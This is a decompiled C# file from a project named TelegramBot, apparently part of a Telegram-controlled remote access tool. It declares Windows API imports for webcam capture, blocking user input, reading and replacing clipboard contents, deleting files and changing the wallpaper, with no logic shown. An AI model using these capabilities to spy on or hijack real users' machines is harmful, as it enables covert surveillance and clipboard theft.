using System;
using System.Runtime.InteropServices;
using System.Text;

namespace TelegramBot
{
	// Token: 0x020000E9 RID: 233
	internal static class DLLImport
	{
		// Token: 0x060002FD RID: 765
		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mciSendStringA")]
		public static extern int mciSendString(string mciCommand, StringBuilder returnValue, int returnLength, IntPtr callback);

		// Token: 0x060002FE RID: 766
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName);

		// Token: 0x060002FF RID: 767
		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] [In] bool fBlockIt);

		// Token: 0x06000300 RID: 768
		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x06000301 RID: 769
		[DllImport("avicap32.dll")]
		public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

		// Token: 0x06000302 RID: 770
		[DllImport("user32.dll")]
		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		// Token: 0x06000303 RID: 771
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetForegroundWindow(IntPtr hWnd);

		// Token: 0x06000304 RID: 772
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x06000305 RID: 773
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x06000306 RID: 774
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool EnumWindows(DLLImport.EnumWindowsProc lpEnumFunc, IntPtr lParam);

		// Token: 0x06000307 RID: 775
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

		// Token: 0x06000308 RID: 776
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int GetWindowTextLength(IntPtr hWnd);

		// Token: 0x06000309 RID: 777
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool IsWindowVisible(IntPtr hWnd);

		// Token: 0x0600030A RID: 778
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

		// Token: 0x0600030B RID: 779
		[DllImport("user32.dll")]
		public static extern IntPtr GetClipboardData(uint uFormat);

		// Token: 0x0600030C RID: 780
		[DllImport("user32.dll")]
		public static extern bool IsClipboardFormatAvailable(uint format);

		// Token: 0x0600030D RID: 781
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool OpenClipboard(IntPtr hWndNewOwner);

		// Token: 0x0600030E RID: 782
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool CloseClipboard();

		// Token: 0x0600030F RID: 783
		[DllImport("kernel32.dll")]
		public static extern IntPtr GlobalLock(IntPtr hMem);

		// Token: 0x06000310 RID: 784
		[DllImport("kernel32.dll")]
		public static extern bool GlobalUnlock(IntPtr hMem);

		// Token: 0x06000311 RID: 785
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
		public static extern IntPtr GetModuleHandle(string lpModuleName);

		// Token: 0x06000312 RID: 786
		[DllImport("wininet.dll")]
		public static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);

		// Token: 0x06000313 RID: 787
		[DllImport("user32")]
		public static extern int GetSystemMetrics(int nIndex);

		// Token: 0x06000314 RID: 788
		[DllImport("User32.dll", CharSet = CharSet.Auto)]
		internal static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);

		// Token: 0x06000315 RID: 789
		[DllImport("User32.dll", CharSet = CharSet.Auto)]
		internal static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);

		// Token: 0x06000316 RID: 790
		[DllImport("user32.dll")]
		internal static extern bool EmptyClipboard();

		// Token: 0x06000317 RID: 791
		[DllImport("user32.dll")]
		internal static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);

		// Token: 0x06000318 RID: 792
		[DllImport("user32.dll")]
		internal static extern IntPtr GetOpenClipboardWindow();

		// Token: 0x04000522 RID: 1314
		public const int SPI_SETDESKWALLPAPER = 20;

		// Token: 0x04000523 RID: 1315
		public const int SPIF_UPDATEINIFILE = 1;

		// Token: 0x04000524 RID: 1316
		public const int SPIF_SENDCHANGE = 2;

		// Token: 0x020000EA RID: 234
		// (Invoke) Token: 0x0600031A RID: 794
		public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
	}
}
